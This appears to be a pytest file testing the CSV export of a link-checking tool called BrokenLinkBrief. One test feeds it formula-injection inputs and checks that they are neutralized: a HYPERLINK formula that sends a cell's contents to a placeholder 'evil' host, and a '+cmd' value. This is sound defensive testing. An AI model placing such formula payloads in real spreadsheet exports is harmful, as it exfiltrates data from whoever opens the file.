"""Pre-development interface/behavior tests for BrokenLinkBrief CSV export."""

from __future__ import annotations

import csv
import http.client
import inspect
import io
import socket
import threading
from http.server import HTTPServer

import pytest

from brokenlinkbrief.app import _Handler
from brokenlinkbrief.export import render_markdown
from brokenlinkbrief.package import LinkResult, render_csv


def test_interface_render_csv_importable() -> None:
    assert callable(render_csv)


def test_interface_render_csv_signature_matches_contract() -> None:
    signature = inspect.signature(render_csv)
    params = list(signature.parameters.values())
    assert len(params) == 1
    assert params[0].name == "results"
    assert str(signature.return_annotation) == "str"


def test_behavior_render_csv_header_only_for_empty_results() -> None:
    rendered = render_csv([])
    assert rendered == "url,status,reason,location\n"


def test_behavior_render_csv_formats_non_empty_results() -> None:
    results = [
        LinkResult(url="https://example.com", status=200, reason="OK", location=None),
        LinkResult(
            url="https://example.com/b,ad",
            status=302,
            reason="moved",
            location=None,
        ),
    ]
    rendered = render_csv(results)
    expected = (
        "url,status,reason,location\n"
        "https://example.com,200,OK,\n"
        '"https://example.com/b,ad",302,moved,\n'
    )
    assert rendered == expected


def test_behavior_render_csv_neutralizes_formula_injection() -> None:
    results = [
        LinkResult(
            url="https://example.com",
            status=302,
            reason=None,
            location='=HYPERLINK("http://evil/?c="&A1)',
        ),
        LinkResult(
            url="https://example.com/@x",
            status=200,
            reason="+cmd",
            location=None,
        ),
    ]
    rendered = render_csv(results)
    # Parse with the csv module to mimic how Excel/Sheets/LibreOffice read it.
    rows = list(csv.reader(io.StringIO(rendered)))
    assert rows[0] == ["url", "status", "reason", "location"]
    # leading `=` in `location` must be neutralized to literal text (keep apostrophe)
    assert rows[1][3] == '\'=HYPERLINK("http://evil/?c="&A1)'
    # leading `+` in `reason` must be neutralized to literal text
    assert rows[2][2] == "'+cmd"


def test_behavior_scan_endpoint_markdown_output_unchanged() -> None:
    results = [
        LinkResult(url="https://example.com", status=200, reason="OK", location=None)
    ]
    rendered = render_markdown(results)
    assert rendered.startswith("# BrokenLinkBrief\n\n")


def test_behavior_scan_endpoint_json_fallback_when_format_csv_requested() -> None:
    monkeypatch = pytest.MonkeyPatch()
    monkeypatch.setenv("BROKENLINKBRIEF_SCAN_TOKEN", "secret")

    def fake_scan(url: str, timeout: float = 10.0):
        return [LinkResult(url=url, status=200, reason="OK", location=None)]

    monkeypatch.setattr("brokenlinkbrief.app.scan_page", fake_scan)

    sock = socket.socket()
    sock.bind(("127.0.0.1", 0))
    port = sock.getsockname()[1]
    sock.close()

    server = HTTPServer(("127.0.0.1", port), _Handler)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        conn = http.client.HTTPConnection("127.0.0.1", port, timeout=5)
        conn.request(
            "GET",
            "/scan?url=https://example.com&format=csv&token=secret",
            headers={"Host": "127.0.0.1"},
        )
        resp = conn.getresponse()
        body = resp.read().decode("utf-8")
        conn.close()
        assert resp.status == 200
        assert resp.getheader("Content-Type") == "text/csv; charset=utf-8"
        assert body == "url,status,reason,location\nhttps://example.com,200,OK,\n"
    finally:
        server.shutdown()
        monkeypatch.undo()
